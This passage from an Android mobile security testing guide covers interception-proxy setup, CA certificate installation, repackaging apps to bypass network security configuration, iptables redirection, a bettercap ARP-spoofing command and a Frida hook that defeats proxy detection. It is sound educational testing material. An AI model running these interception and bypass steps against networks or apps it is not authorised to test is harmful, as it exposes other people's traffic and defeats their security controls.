\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/2e818595a18a1cfbf5f33ff73d6c378862712b89.png}
\caption{Images/Chapters/0x05b/FCM\_Intercept.png}
\end{figure}

End-to-End Encryption for Push Notifications

As an additional layer of security, push notifications can be encrypted
by using \href{https://github.com/google/capillary}{Capillary}.
Capillary is a library to simplify the sending of end-to-end (E2E)
encrypted push messages from Java-based application servers to Android
clients.

\hypertarget{setting-up-an-interception-proxy}{%
\paragraph{Setting Up an Interception
Proxy}\label{setting-up-an-interception-proxy}}

Several tools support the network analysis of applications that rely on
the HTTP(S) protocol. The most important tools are the so-called
interception proxies; OWASP ZAP and Burp Suite Professional are the most
famous. An interception proxy gives the tester a man-in-the-middle
position. This position is useful for reading and/or modifying all app
requests and endpoint responses, which are used for testing
Authorization, Session, Management, etc.

\hypertarget{interception-proxy-for-a-virtual-device}{%
\subparagraph{Interception Proxy for a Virtual
Device}\label{interception-proxy-for-a-virtual-device}}

Setting Up a Web Proxy on an Android Virtual Device (AVD)

The following procedure, which works on the Android emulator that ships
with Android Studio 3.x, is for setting up an HTTP proxy on the
emulator:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Set up your proxy to listen on localhost and for example port 8080.
\item
  Configure the HTTP proxy in the emulator settings:

  \begin{itemize}
  \tightlist
  \item
    Click on the three dots in the emulator menu bar
  \item
    Open the \textbf{Settings} Menu
  \item
    Click on the \textbf{Proxy} tab
  \item
    Select \textbf{Manual proxy configuration}
  \item
    Enter ``127.0.0.1'' in the \textbf{Host Name} field and your proxy
    port in the \textbf{Port number} field (e.g., ``8080'')
  \item
    Tap \textbf{Apply}
  \end{itemize}
\end{enumerate}

\begin{figure}
\centering
\includegraphics[width=6.25in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/9cdb0f9a684dd8350455778005a9452a8ce54d1f.png}
\caption{Emulator proxy}
\end{figure}

HTTP and HTTPS requests should now be routed over the proxy on the host
machine. If not, try toggling airplane mode off and on.

A proxy for an AVD can also be configured on the command line by using
the
\href{https://developer.android.com/studio/run/emulator-commandline}{emulator
command} when starting an AVD. The following example starts the AVD
Nexus\_5X\_API\_23 and setting a proxy to 127.0.0.1 and port 8080.

\begin{verbatim}
$ emulator @Nexus_5X_API_23 -http-proxy 127.0.0.1:8080
\end{verbatim}

Installing a CA Certificate on the Virtual Device

An easy way to install a CA certificate is to push the certificate to
the device and add it to the certificate store via Security Settings.
For example, you can install the PortSwigger (Burp) CA certificate as
follows:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Start Burp and use a web browser on the host to navigate to burp/,
  then download \texttt{cacert.der} by clicking the ``CA Certificate''
  button.
\item
  Change the file extension from \texttt{.der} to \texttt{.cer}.
\item
  Push the file to the emulator:

\begin{verbatim}
$ adb push cacert.cer /sdcard/
\end{verbatim}
\item
  Navigate to \textbf{Settings} -\textgreater{} \textbf{Security}
  -\textgreater{} \textbf{Install from SD Card}.
\item
  Scroll down and tap \texttt{cacert.cer}.
\end{enumerate}

You should then be prompted to confirm installation of the certificate
(you'll also be asked to set a device PIN if you haven't already).

For Android 7.0 (API level 24) and above follow the same procedure
described in the
``\protect\hyperlink{bypassing-the-network-security-configuration}{Bypassing
the Network Security Configuration}'' section.

\hypertarget{interception-proxy-for-a-physical-device}{%
\subparagraph{Interception Proxy for a Physical
Device}\label{interception-proxy-for-a-physical-device}}

The available network setup options must be evaluated first. The mobile
device used for testing and the machine running the interception proxy
must be connected to the same Wi-Fi network. Use either an (existing)
access point or create
\href{https://support.portswigger.net/customer/portal/articles/1841150-Mobile\%20Set-up_Ad-hoc\%20network_OSX.html}{an
ad-hoc wireless network}.

Once you've configured the network and established a connection between
the testing machine and the mobile device, several steps remain.

\begin{itemize}
\tightlist
\item
  The proxy must be
  \href{https://support.portswigger.net/customer/portal/articles/1841101-Mobile\%20Set-up_Android\%20Device.html}{configured
  to point to the interception proxy}.
\item
  The
  \href{https://support.portswigger.net/customer/portal/articles/1841102-installing-burp-s-ca-certificate-in-an-android-device}{interception
  proxy's CA certificate must be added to the trusted certificates in
  the Android device's certificate storage}. The location of the menu
  used to store CA certificates may depend on the Android version and
  Android OEM modifications of the settings menu.
\item
  Some application (e.g.~the
  \href{https://bugs.chromium.org/p/chromium/issues/detail?id=475745}{Chrome
  browser}) may show \texttt{NET::ERR\_CERT\_VALIDITY\_TOO\_LONG}
  errors, if the leaf certificate happens to have a validity extending a
  certain time (39 months in case of Chrome). This happens if the
  default Burp CA certificate is used, since the Burp Suite issues leaf
  certificates with the same validity as its CA certificate. You can
  circumvent this by creating your own CA certificate and import it to
  the Burp Suite, as explained in a
  \href{https://blog.nviso.be/2018/01/31/using-a-custom-root-ca-with-burp-for-inspecting-android-n-traffic/}{blog
  post on nviso.be}.
\end{itemize}

After completing these steps and starting the app, the requests should
show up in the interception proxy.

\begin{quote}
A video of setting up OWASP ZAP with an Android device can be found on
\href{https://security.secure.force.com/security/tools/webapp/zapandroidsetup}{secure.force.com}.
\end{quote}

A few other differences: from Android 8.0 (API level 26) onward, the
network behavior of the app changes when HTTPS traffic is tunneled
through another connection. And from Android 9 (API level 28) onward,
the SSLSocket and SSLEngine will behave a little bit different in terms
of error handling when something goes wrong during the handshakes.

As mentioned before, starting with Android 7.0 (API level 24), the
Android OS will no longer trust user CA certificates by default, unless
specified in the application. In the following section, we explain two
methods to bypass this Android security control.

\hypertarget{bypassing-the-network-security-configuration}{%
\subparagraph{Bypassing the Network Security
Configuration}\label{bypassing-the-network-security-configuration}}

From Android 7.0 (API level 24) onwards, the network security
configuration allows apps to customize their network security settings,
by defining which CA certificates the app will be trusting.

In order to implement the network security configuration for an app, you
would need to create a new xml resource file with the name
\texttt{network\_security\_config.xml}. This is explained in detail in
one of the
\href{https://codelabs.developers.google.com/codelabs/android-network-security-config/\#3}{Google
Android Codelabs}.

After the creation, the apps must also include an entry in the manifest
file to point to the new network security configuration file.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<?xml}\NormalTok{ version="1.0" encoding="utf{-}8"}\KeywordTok{?>}
\KeywordTok{<manifest} \ErrorTok{...} \KeywordTok{>}
    \KeywordTok{<application}\OtherTok{ android:networkSecurityConfig=}\StringTok{"@xml/network\_security\_config"}
                    \ErrorTok{...} \KeywordTok{>}
\NormalTok{        ...}
    \KeywordTok{</application>}
\KeywordTok{</manifest>}
\end{Highlighting}
\end{Shaded}

The network security configuration uses an XML file where the app
specifies which CA certificates will be trusted. There are various ways
to bypass the Network Security Configuration, which will be described
below. Please also see the
\href{https://www.nowsecure.com/blog/2018/08/15/a-security-analysts-guide-to-network-security-configuration-in-android-p/}{Security
Analyst's Guide to Network Security Configuration in Android P} for
further information.

Adding the User Certificates to the Network Security Configuration

There are different configurations available for the Network Security
Configuration to
\href{https://developer.android.com/training/articles/security-config\#CustomTrust}{add
non-system Certificate Authorities} via the src attribute:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<certificates}\OtherTok{ src=}\ErrorTok{[}\StringTok{"system"} \ErrorTok{|} \ErrorTok{"user"} \ErrorTok{|} \ErrorTok{"raw}\OtherTok{ resource}\ErrorTok{"]}
              \ErrorTok{overridePins}\OtherTok{=}\ErrorTok{[}\StringTok{"true"} \ErrorTok{|} \ErrorTok{"false"]} \KeywordTok{/>}
\end{Highlighting}
\end{Shaded}

Each certificate can be one of the following:

\begin{itemize}
\tightlist
\item
  a ``raw resource'' ID pointing to a file containing X.509 certificates
\item
  ``system'' for the pre-installed system CA certificates
\item
  ``user'' for user-added CA certificates
\end{itemize}

The CA certificates trusted by the app can be a system trusted CA as
well as a user CA. Usually you will have added the certificate of your
interception proxy already as additional CA in Android. Therefore we
will focus on the ``user'' setting, which allows you to force the
Android app to trust this certificate with the following Network
Security Configuration configuration below:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<network{-}security{-}config>}
   \KeywordTok{<base{-}config>}
      \KeywordTok{<trust{-}anchors>}
          \KeywordTok{<certificates}\OtherTok{ src=}\StringTok{"system"} \KeywordTok{/>}
          \KeywordTok{<certificates}\OtherTok{ src=}\StringTok{"user"} \KeywordTok{/>}
      \KeywordTok{</trust{-}anchors>}
   \KeywordTok{</base{-}config>}
\KeywordTok{</network{-}security{-}config>}
\end{Highlighting}
\end{Shaded}

To implement this new setting you must follow the steps below:

\begin{itemize}
\item
  Decompile the app using a decompilation tool like apktool:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{apktool}\NormalTok{ d }\OperatorTok{<}\NormalTok{filename}\OperatorTok{>}\NormalTok{.apk}
\end{Highlighting}
\end{Shaded}
\item
  Make the application trust user certificates by creating a network
  security configuration that includes
  \texttt{\textless{}certificates\ src="user"\ /\textgreater{}} as
  explained above
\item
  Go into the directory created by apktool when decompiling the app and
  rebuild the app using apktool. The new apk will be in the
  \texttt{dist} directory.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{apktool}\NormalTok{ b}
\end{Highlighting}
\end{Shaded}
\item
  You need to repackage the app, as explained in the
  ``\href{0x05c-Reverse-Engineering-and-Tampering.md\#repackaging}{Repackaging}''
  section of the ``Reverse Engineering and Tampering'' chapter. For more
  details on the repackaging process you can also consult the
  \href{https://developer.android.com/studio/publish/app-signing\#signing-manually}{Android
  developer documentation}, that explains the process as a whole.
\end{itemize}

Note that even if this method is quite simple its major drawback is that
you have to apply this operation for each application you want to
evaluate which is additional overhead for testing.

\begin{quote}
Bear in mind that if the app you are testing has additional hardening
measures, like verification of the app signature you might not be able
to start the app anymore. As part of the repackaging you will sign the
app with your own key and therefore the signature changes will result in
triggering such checks that might lead to immediate termination of the
app. You would need to identify and disable such checks either by
patching them during repackaging of the app or dynamic instrumentation
through Frida.
\end{quote}

There is a python script available that automates the steps described
above called
\href{https://github.com/51j0/Android-CertKiller}{Android-CertKiller}.
This Python script can extract the APK from an installed Android app,
decompile it, make it debuggable, add a new network security config that
allows user certificates, builds and signs the new APK and installs the
new APK with the SSL Bypass.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{python}\NormalTok{ main.py {-}w}

\ExtensionTok{***************************************}
\ExtensionTok{Android}\NormalTok{ CertKiller (v0.1)}
\ExtensionTok{***************************************}

\ExtensionTok{CertKiller}\NormalTok{ Wizard Mode}
\ExtensionTok{{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
\ExtensionTok{List}\NormalTok{ of devices attached}
\ExtensionTok{4200dc72f27bc44d}\NormalTok{    device}

\ExtensionTok{{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}

\ExtensionTok{Enter}\NormalTok{ Application Package Name: nsc.android.mstg.owasp.org.android\_nsc}

\ExtensionTok{Package}\NormalTok{: /data/app/nsc.android.mstg.owasp.org.android\_nsc{-}1/base.apk}

\ExtensionTok{I.}\NormalTok{ Initiating APK extraction from device}
   \BuiltInTok{complete}
\ExtensionTok{{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
\ExtensionTok{I.}\NormalTok{ Decompiling}
   \BuiltInTok{complete}
\ExtensionTok{{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
\ExtensionTok{I.}\NormalTok{ Applying SSL bypass}
   \BuiltInTok{complete}
\ExtensionTok{{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
\ExtensionTok{I.}\NormalTok{ Building New APK}
   \BuiltInTok{complete}
\ExtensionTok{{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
\ExtensionTok{I.}\NormalTok{ Signing APK}
   \BuiltInTok{complete}
\ExtensionTok{{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}

\ExtensionTok{Would}\NormalTok{ you like to install the APK on your device(y/N)}\BuiltInTok{:}\NormalTok{ y}
\ExtensionTok{{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
 \ExtensionTok{Installing}\NormalTok{ Unpinned APK}
\ExtensionTok{{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}{-}}
\ExtensionTok{Finished}
\end{Highlighting}
\end{Shaded}

Adding the Proxy's certificate among system trusted CAs using Magisk

In order to avoid the obligation of configuring the Network Security
Configuration for each application, we must force the device to accept
the proxy's certificate as one of the systems trusted certificates.

There is a
\href{https://github.com/NVISO-BE/MagiskTrustUserCerts}{Magisk module}
that will automatically add all user-installed CA certificates to the
list of system trusted CAs.

Download the latest version of the module at the
\href{https://github.com/NVISO-BE/MagiskTrustUserCerts/releases}{Github
Release page}, push the downloaded file over to the device and import it
in the Magisk Manager's ``Module'' view by clicking on the \texttt{+}
button. Finally, a restart is required by Magisk Manager to let changes
take effect.

From now on, any CA certificate that is installed by the user via
``Settings'', ``Security \& location'', ``Encryption \& credentials'',
``Install from storage'' (location may differ) is automatically pushed
into the system's trust store by this Magisk module. Reboot and verify
that the CA certificate is listed in ``Settings'', ``Security \&
location'', ``Encryption \& credentials'', ``Trusted credentials''
(location may differ).

Manually adding the Proxy's certificate among system trusted CAs

Alternatively, you can follow the following steps manually in order to
achieve the same result:

\begin{itemize}
\item
  Make the /system partition writable, which is only possible on a
  rooted device. Run the `mount' command to make sure the /system is
  writable: \texttt{mount\ -o\ rw,remount\ /system}. If this command
  fails, try running the following command
  \texttt{mount\ -o\ rw,remount\ -t\ ext4\ /system}
\item
  Prepare the proxy's CA certificates to match system certificates
  format. Export the proxy's certificates in \texttt{der} format (this
  is the default format in Burp Suite) then run the following commands:

\begin{verbatim}
$ openssl x509 -inform DER -in cacert.der -out cacert.pem
$ openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1
mv cacert.pem <hash>.0
\end{verbatim}
\item
  Finally, copy the \texttt{\textless{}hash\textgreater{}.0} file into
  the directory /system/etc/security/cacerts and then run the following
  command:

\begin{verbatim}
chmod 644 <hash>.0
\end{verbatim}
\end{itemize}

By following the steps described above you allow any application to
trust the proxy's certificate, which allows you to intercept its
traffic, unless of course the application uses SSL pinning.

\hypertarget{potential-obstacles}{%
\paragraph{Potential Obstacles}\label{potential-obstacles}}

Applications often implement security controls that make it more
difficult to perform a security review of the application, such as root
detection and certificate pinning. Ideally, you would acquire both a
version of the application that has these controls enabled, and one
where the controls are disabled. This allows you to analyze the proper
implementation of the controls, after which you can continue with the
less-secure version for further tests.

Of course, this is not always possible, and you may need to perform a
black-box assessment on an application where all security controls are
enabled. The section below shows you how you can circumvent certificate
pinning for different applications.

\hypertarget{client-isolation-in-wireless-networks}{%
\subparagraph{Client Isolation in Wireless
Networks}\label{client-isolation-in-wireless-networks}}

Once you have setup an interception proxy and have a MITM position you
might still not be able to see anything. This might be due to
restrictions in the app (see next section) but can also be due to so
called client isolation in the Wi-Fi that you are connected to.

\href{https://documentation.meraki.com/MR/Firewall_and_Traffic_Shaping/Wireless_Client_Isolation}{Wireless
Client Isolation} is a security feature that prevents wireless clients
from communicating with one another. This feature is useful for guest
and BYOD SSIDs adding a level of security to limit attacks and threats
between devices connected to the wireless networks.

What to do if the Wi-Fi we need for testing has client isolation?

You can configure the proxy on your Android device to point to
127.0.0.1:8080, connect your phone via USB to your laptop and use adb to
make a reverse port forwarding:

\begin{verbatim}
$ adb reverse tcp:8080 tcp:8080
\end{verbatim}

Once you have done this all proxy traffic on your Android phone will be
going to port 8080 on 127.0.0.1 and it will be redirected via adb to
127.0.0.1:8080 on your laptop and you will see now the traffic in your
Burp. With this trick you are able to test and intercept traffic also in
Wi-Fis that have client isolation.

\hypertarget{non-proxy-aware-apps}{%
\subparagraph{Non-Proxy Aware Apps}\label{non-proxy-aware-apps}}

Once you have setup an interception proxy and have a MITM position you
might still not be able to see anything. This is mainly due to the
following reasons:

\begin{itemize}
\tightlist
\item
  The app is using a framework like Xamarin that simply is not using the
  proxy settings of the Android OS or
\item
  The app you are testing is verifying if a proxy is set and is not
  allowing now any communication.
\end{itemize}

In both scenarios you would need additional steps to finally being able
to see the traffic. In the sections below we are describing two
different solutions, bettercap and iptables.

You could also use an access point that is under your control to
redirect the traffic, but this would require additional hardware and we
focus for now on software solutions.

\begin{quote}
For both solutions you need to activate ``Support invisible proxying''
in Burp, in Proxy Tab/Options/Edit Interface.
\end{quote}

iptables

You can use iptables on the Android device to redirect all traffic to
your interception proxy. The following command would redirect port 80 to
your proxy running on port 8080

\begin{verbatim}
$ iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination <Your-Proxy-IP>:8080
\end{verbatim}

Verify the iptables settings and check the IP and port.

\begin{verbatim}
$ iptables -t nat -L
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination

Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
DNAT       tcp  --  anywhere             anywhere             tcp dpt:5288 to:<Your-Proxy-IP>:8080

Chain POSTROUTING (policy ACCEPT)
target     prot opt source               destination

Chain natctrl_nat_POSTROUTING (0 references)
target     prot opt source               destination

Chain oem_nat_pre (0 references)
target     prot opt source               destination
\end{verbatim}

In case you want to reset the iptables configuration you can flush the
rules:

\begin{verbatim}
$ iptables -t nat -F
\end{verbatim}

bettercap

Read the chapter ``Testing Network Communication'' and the test case
``Simulating a Man-in-the-Middle Attack'' for further preparation and
instructions for running bettercap.

The machine where you run your proxy and the Android device must be
connected to the same wireless network. Start bettercap with the
following command, replacing the IP address below (X.X.X.X) with the IP
address of your Android device.

\begin{verbatim}
$ sudo bettercap -eval "set arp.spoof.targets X.X.X.X; arp.spoof on; set arp.spoof.internal true; set arp.spoof.fullduplex true;"
bettercap v2.22 (built for darwin amd64 with go1.12.1) [type 'help' for a list of commands]

[19:21:39] [sys.log] [inf] arp.spoof enabling forwarding
[19:21:39] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
\end{verbatim}

\hypertarget{proxy-detection}{%
\subparagraph{Proxy Detection}\label{proxy-detection}}

Some mobile apps are trying to detect if a proxy is set. If that's the
case they will assume that this is malicious and will not work properly.

In order to bypass such a protection mechanism you could either setup
bettercap or configure iptables that don't need a proxy setup on your
Android phone. A third option we didn't mention before and that is
applicable in this scenario is using Frida. It is possible on Android to
detect if a system proxy is set by querying the
\href{https://developer.android.com/reference/android/net/ProxyInfo}{\texttt{ProxyInfo}}
class and check the getHost() and getPort() methods. There might be
various other methods to achieve the same task and you would need to
decompile the APK in order to identify the actual class and method name.

Below you can find boiler plate source code for a Frida script that will
help you to overload the method (in this case called isProxySet) that is
verifying if a proxy is set and will always return false. Even if a
proxy is now configured the app will now think that none is set as the
function returns false.

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{setTimeout}\NormalTok{(}\KeywordTok{function}\NormalTok{()}\OperatorTok{\{}
    \VariableTok{Java}\NormalTok{.}\AttributeTok{perform}\NormalTok{(}\KeywordTok{function}\NormalTok{ ()}\OperatorTok{\{}
        \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"[*] Script loaded"}\NormalTok{)}

        \KeywordTok{var}\NormalTok{ Proxy }\OperatorTok{=} \VariableTok{Java}\NormalTok{.}\AttributeTok{use}\NormalTok{(}\StringTok{"<package{-}name>.<class{-}name>"}\NormalTok{)}

        \VariableTok{Proxy}\NormalTok{.}\VariableTok{isProxySet}\NormalTok{.}\AttributeTok{overload}\NormalTok{().}\AttributeTok{implementation} \OperatorTok{=} \KeywordTok{function}\NormalTok{() }\OperatorTok{\{}
            \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{"[*] isProxySet function invoked"}\NormalTok{)}
            \ControlFlowTok{return} \KeywordTok{false}
        \OperatorTok{\}}
    \OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

\hypertarget{certificate-pinning}{%
\subparagraph{Certificate Pinning}\label{certificate-pinning}}

Some applications will implement SSL Pinning, which prevents the
application from accepting your intercepting certificate as a valid
certificate. This means that you will not be able to monitor the traffic
between the application and the server.

For information on disabling SSL Pinning both statically and
dynamically, refer to ``Bypassing SSL Pinning'' in the ``Testing Network
Communication'' chapter.

\hypertarget{references-7}{%
\subsubsection{References}\label{references-7}}

\begin{itemize}
\tightlist
\item
  Signing Manually (Android developer documentation) -
  \url{https://developer.android.com/studio/publish/app-signing\#signing-manually}
\item
  Custom Trust -
  \url{https://developer.android.com/training/articles/security-config\#CustomTrust}
\item
  Basic Network Security Configuration -
  \url{https://codelabs.developers.google.com/codelabs/android-network-security-config/\#3}
\item
  Security Analyst's Guide to Network Security Configuration in Android
  P -
  \url{https://www.nowsecure.com/blog/2018/08/15/a-security-analysts-guide-to-network-security-configuration-in-android-p/}
\item
  Android developer documentation -
  \url{https://developer.android.com/studio/publish/app-signing\#signing-manually}
\item
  Android 8.0 Behavior Changes -
  \url{https://developer.android.com/about/versions/oreo/android-8.0-changes}
\item
  Android 9.0 Behavior Changes -
  \url{https://developer.android.com/about/versions/pie/android-9.0-changes-all\#device-security-changes}
\item
  Codenames, Tags and Build Numbers -
  \url{https://source.android.com/setup/start/build-numbers}
\item
  Create and Manage Virtual Devices -
  \url{https://developer.android.com/studio/run/managing-avds.html}
\item
  Guide to rooting mobile devices -
  \url{https://www.xda-developers.com/root/}
\item
  API Levels -
  \url{https://developer.android.com/guide/topics/manifest/uses-sdk-element\#ApiLevels}
\item
  AssetManager -
  \url{https://developer.android.com/reference/android/content/res/AssetManager}
\item
  SharedPreferences APIs -
  \url{https://developer.android.com/training/basics/data-storage/shared-preferences.html}
\item
  Debugging with Logcat -
  \url{https://developer.android.com/tools/debugging/debugging-log.html}
\item
  Android's APK format -
  \url{https://en.wikipedia.org/wiki/Android_application_package}
\item
  Android remote sniffing using Tcpdump, nc and Wireshark -
  \url{https://blog.dornea.nu/2015/02/20/android-remote-sniffing-using-tcpdump-nc-and-wireshark/}
\item
  Wireless Client Isolation -
  \url{https://documentation.meraki.com/MR/Firewall_and_Traffic_Shaping/Wireless_Client_Isolation}
\end{itemize}

\hypertarget{tools-3}{%
\paragraph{Tools}\label{tools-3}}

\begin{itemize}
\tightlist
\item
  adb - \url{https://developer.android.com/studio/command-line/adb}
\item
  Androbugs - \url{https://github.com/AndroBugs/AndroBugs_Framework}
\item
  Android NDK Downloads -
  \url{https://developer.android.com/ndk/downloads/index.html\#stable-downloads}
\item
  Android Platform Tools -
  \url{https://developer.android.com/studio/releases/platform-tools.html}
\item
  Android Studio - \url{https://developer.android.com/studio/index.html}
\item
  Android tcpdump - \url{https://www.androidtcpdump.com/}
\item
  Android-CertKiller - \url{https://github.com/51j0/Android-CertKiller}
\item
  Android-SSL-TrustKiller -
  \url{https://github.com/iSECPartners/Android-SSL-TrustKiller}
\item
  angr - \url{https://github.com/angr/angr}
\item
  APK Extractor -
  \url{https://play.google.com/store/apps/details?id=com.ext.ui}
\item
  APKMirror - \url{https://apkmirror.com}
\item
  APKPure - \url{https://apkpure.com}
\item
  apktool - \url{https://github.com/iBotPeaches/Apktool}
\item
  apkx - \url{https://github.com/b-mueller/apkx}
\item
  Burp Suite Professional - \url{https://portswigger.net/burp/}
\item
  Burp-non-HTTP-Extension -
  \url{https://github.com/summitt/Burp-Non-HTTP-Extension}
\item
  Capillary - \url{https://github.com/google/capillary}
\item
  Device File Explorer -
  \url{https://developer.android.com/studio/debug/device-file-explorer}
\item
  Drozer - \url{https://labs.f-secure.com/tools/drozer/}
\item
  FileZilla - \url{https://filezilla-project.org/download.php}
\item
  Frida - \url{https://www.frida.re/docs/android/}
\item
  Frida CLI - \url{https://www.frida.re/docs/frida-cli/}
\item
  frida-ls-devices - \url{https://www.frida.re/docs/frida-ls-devices/}
\item
  frida-ps - \url{https://www.frida.re/docs/frida-ps/}
\item
  frida-trace - \url{https://www.frida.re/docs/frida-trace/}
\item
  gplaycli - \url{https://github.com/matlink/gplaycli}
\item
  House - \url{https://github.com/nccgroup/house}
\item
  InsecureBankv2 -
  \url{https://github.com/dineshshetty/Android-InsecureBankv2}
\item
  Inspeckage - \url{https://github.com/ac-pm/Inspeckage}
\item
  JAADAS - \url{https://github.com/flankerhqd/JAADAS}
\item
  JustTrustMe - \url{https://github.com/Fuzion24/JustTrustMe}
\item
  Magisk Modules repository -
  \url{https://github.com/Magisk-Modules-Repo}
\item
  Magisk Trust User Certs module -
  \url{https://github.com/NVISO-BE/MagiskTrustUserCerts/releases}
\item
  Mitm-relay - \url{https://github.com/jrmdev/mitm_relay}
\item
  MobSF - \url{https://github.com/MobSF/Mobile-Security-Framework-MobSF}
\item
  Nathan - \url{https://github.com/mseclab/nathan}
\item
  Objection - \url{https://github.com/sensepost/objection}
\item
  OWASP ZAP -
  \url{https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project}
\item
  QARK - \url{https://github.com/linkedin/qark/}
\item
  R2frida - \url{https://github.com/nowsecure/r2frida/}
\item
  Radare2 - \url{https://rada.re/r/}
\item
  SDK tools -
  \url{https://developer.android.com/studio/index.html\#downloads}
\item
  SSLUnpinning - \url{https://github.com/ac-pm/SSLUnpinning_Xposed}
\item
  Termux -
  \url{https://play.google.com/store/apps/details?id=com.termux}
\item
  Wireshark - \url{https://www.wireshark.org/}
\item
  Xposed - \url{https://www.xda-developers.com/xposed-framework-hub/}
\end{itemize}

\hypertarget{tampering-and-reverse-engineering-on-android}{%
\subsection{Tampering and Reverse Engineering on
Android}\label{tampering-and-reverse-engineering-on-android}}

Android's openness makes it a favorable environment for reverse
engineers. In the following chapter, we'll look at some peculiarities of
Android reversing and OS-specific tools as processes.

Android offers reverse engineers big advantages that are not available
with iOS. Because Android is open-source, you can study its source code
at the Android Open Source Project (AOSP) and modify the OS and its
standard tools any way you want. Even on standard retail devices, it is
possible to do things like activating developer mode and sideloading
apps without jumping through many hoops. From the powerful tools
shipping with the SDK to the wide range of available reverse engineering
tools, there's a lot of niceties to make your life easier.

However, there are also a few Android-specific challenges. For example,
you'll need to deal with both Java bytecode and native code. Java Native
Interface (JNI) is sometimes deliberately used to confuse reverse
engineers (to be fair, there are legitimate reasons for using JNI, such
as improving performance or supporting legacy code). Developers
sometimes use the native layer to ``hide'' data and functionality, and
they may structure their apps such that execution frequently jumps
between the two layers.

You'll need at least a working knowledge of both the Java-based Android
environment and the Linux OS and Kernel, on which Android is based.
You'll also need the right toolset to deal with both the bytecode
running on the Java virtual machine and the native code.

Note that we'll use the
\href{https://github.com/OWASP/owasp-mstg/blob/master/Crackmes/}{OWASP
Mobile Testing Guide Crackmes} as examples for demonstrating various
reverse engineering techniques in the following sections, so expect
partial and full spoilers. We encourage you to have a crack at the
challenges yourself before reading on!

\hypertarget{reverse-engineering}{%
\subsubsection{Reverse Engineering}\label{reverse-engineering}}

Reverse engineering is the process of taking an app apart to find out
how it works. You can do this by examining the compiled app (static
analysis), observing the app during runtime (dynamic analysis), or a
combination of both.

\hypertarget{tooling}{%
\paragraph{Tooling}\label{tooling}}

Make sure that the following is installed on your system (see the
``\href{0x05b-Basic-Security_Testing.md}{Android Basic Security
Testing}'' chapter for installation instructions):

\begin{itemize}
\tightlist
\item
  The newest SDK Tools and SDK Platform-Tools packages. These packages
  include the Android Debugging Bridge (ADB) client and other tools that
  interface with the Android platform.
\item
  The Android NDK. This is the Native Development Kit that contains
  prebuilt toolchains for cross-compiling native code for different
  architectures. You'll need it if you plan to deal with native code,
  e.g.~to inspect it or to be able to debug or trace it (the NDK
  contains useful prebuilt versions of such as gdbserver or strace for
  various architectures).
\end{itemize}

In addition to the SDK and NDK, you'll also need something to make Java
bytecode more human-readable. Fortunately, Java decompilers generally
handle Android bytecode well. Popular free decompilers include
\href{http://jd.benow.ca/}{JD},
\href{http://www.javadecompilers.com/jad}{JAD},
\href{https://bitbucket.org/mstrobel/procyon/overview}{Procyon}, and
\href{https://www.benf.org/other/cfr/}{CFR}. For convenience, we have
packed some of these decompilers into our
\href{https://github.com/b-mueller/apkx}{apkx wrapper script}. This
script completely automates the process of extracting Java code from
release APK files and makes it easy to experiment with different
backends (we'll also use it in some of the following examples).

Other tools are really a matter of preference and budget. A ton of free
and commercial disassemblers, decompilers, and frameworks with different
strengths and weaknesses exist. We'll be covering some of them in this
chapter.

\hypertarget{building-a-reverse-engineering-environment-for-free}{%
\subparagraph{Building a Reverse Engineering Environment for
Free}\label{building-a-reverse-engineering-environment-for-free}}

With a little effort, you can build a reasonable GUI-based reverse
engineering environment for free.

For navigating the decompiled sources, we recommend
\href{https://www.jetbrains.com/idea/}{IntelliJ}, a relatively
lightweight IDE that works great for browsing code and allows basic
on-device debugging of the decompiled apps. However, if you prefer
